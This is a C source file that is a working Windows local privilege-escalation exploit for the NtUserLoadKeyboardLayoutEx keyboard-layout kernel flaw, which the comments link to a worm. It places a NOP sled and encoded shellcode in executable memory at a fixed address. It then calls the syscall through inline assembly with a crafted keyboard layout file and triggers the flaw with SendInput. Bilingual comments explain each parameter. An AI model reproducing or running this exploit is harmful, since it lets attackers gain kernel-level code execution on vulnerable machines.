
#define _WIN32_WINNT 0x0501
#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING
{
	WORD Length;
	WORD MaximumLength;
	LPWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

#define SIZE 32*1024
#define OFFSET 6*4*1024


char shellcode[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"



"\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9"
"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92"
"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84"
"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e"
"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1"
"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27"
"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb"
"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b"
"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2"
"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37"
"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3"
"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef"
"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb"
"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf"
"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83"
"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3"
"\x9a\xca\xc0";




/*
"\x50\x58\x50\x58\xfa\x0f\x20\xc0\x50\x25\xff\xff\xfe\xff"
"\x0f\x22\xc0\x60";
*/

void main()
{

	
	void *pBuf = VirtualAlloc((void *)0x60630000, SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	unsigned long *pCopy =  (unsigned long *)pBuf;
	unsigned long pShell = (unsigned long)pCopy + OFFSET;
	if(pCopy)
	{
	
		printf("buffer address: %lx\n", pShell);
		memcpy((unsigned long *)pShell, shellcode, sizeof(shellcode));
	    //memset(pCopy, 0x90, SIZE);
		//VirtualCopy((void *)0x60636261, shellcode, sizeof(shellcode));
		//printf("pShell: %x\n", *(unsigned int *)pShell);
		//VirtualFree(pBuf,SIZE,MEM_RELEASE);
	
	}
    


	//!!! Hard coded NtUserLoadKeyboardLayoutEx !!!
	DWORD NtUserLoadKeyboardLayoutEx = 0x77d212a0; 
	LPWSTR wszUserKLID = L"00008009";

	HANDLE hFile;
	INPUT key;

	PUNICODE_STRING  puserKLID         = new UNICODE_STRING();
	PUNICODE_STRING  puserKeyboardName = new UNICODE_STRING();

	DWORD Flags	= 0x101; //指定如何装入键盘布局：KLF_ACTIVATE|KLF_SETFORPROCESS
	//Specifies how the input locale identifier is to be loaded
	//This flag is valid only with KLF_ACTIVATE. 
	//Activates the specified input locale identifier for the entire process and sends the WM_INPUTLANGCHANGE message to the current thread's Focus or Active window. 
	//Typically, LoadKeyboardLayout activates an input locale identifier only for the current thread.
	DWORD dwKLID	= 0x80098009; //缓冲区中的存放装入的键盘布局名称
	//The name of the input locale identifier to load.
	// This name is a string composed of the hexadecimal value of the Language Identifier (low word) and a device identifier (high word). 
	DWORD offTable  = 0x01ae0160;
	//The worm loads a special keyboard layout file by calling NtUserLoadKeyboardLayoutEx 
	//and passing it the following hexadecimal constant 0x01AE0160 as an offTable parameter. 
	//The low word of this parameter specifies the RVA (Relative Virtual Address) of the KBDTABLES structure from the beginning of the file, 
	//while the high word specifies the RVA of KBDNLSTABLES, which is of particular interest. 
	
	
	puserKLID->Buffer = wszUserKLID;
	puserKLID->Length = wcslen(wszUserKLID) * 2;
	puserKLID->MaximumLength = puserKLID->Length + 2;

	puserKeyboardName->Buffer = L"";
	puserKeyboardName->Length = 0;
	puserKeyboardName->MaximumLength = 0;

	HKL hKL = GetKeyboardLayout(GetCurrentThreadId()); //该函数可以获得指定线程的活动键盘布局，获取线程唯一的线程标识符 
	
	hFile = CreateFileA("keyboard.tmp",    
                   GENERIC_READ,          
                   FILE_SHARE_READ,       
                   NULL,                  
                   OPEN_EXISTING,       
                   FILE_ATTRIBUTE_NORMAL, 
                   NULL);                
 

	// LoadKeyboardLayout: 该函数给系统中装入一种新的键盘布局
	__asm
	{
		push Flags    
		push dwKLID
		push puserKLID
		push hKL // the handle to a keyboard layout file
		push puserKeyboardName
		push offTable // an offset into keyboard layout
		push hFile // a keyboard layout file
		call NtUserLoadKeyboardLayoutEx  //Loads keyboard layout with given locale id
	}

	ActivateKeyboardLayout(hKL, Flags); // 激活键盘布局。hKL：将被激活的键盘布局的句柄，Flags:定义键盘布局如何被激活

	memset(&key, 0, sizeof(key));
	key.type = 1;
	
	SendInput(1, &key, sizeof(key)); //该函数合成键盘事件和鼠标事件，用来模拟鼠标或者键盘操作。事件将被插入在鼠标或者键盘处理队列里面。
    //The number of structures in the pInputs array.
	//An array of INPUT structures. Each structure represents an event to be inserted into the keyboard or mouse input stream.
	//key.type=1 -> INPUT_KEYBOARD=1, the event is a keyboard event. Use the ki structure of the union.
	//The size, in bytes, of an INPUT structure. If cbSize is not the size of an INPUT structure, the function fails.
	CloseHandle(hFile);

	//VirtualAlloc((void *)0x60630000, SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//memcpy((void *)0x60636261, shellcode, sizeof(shellcode));
	VirtualFree(pBuf,SIZE,MEM_RELEASE);
}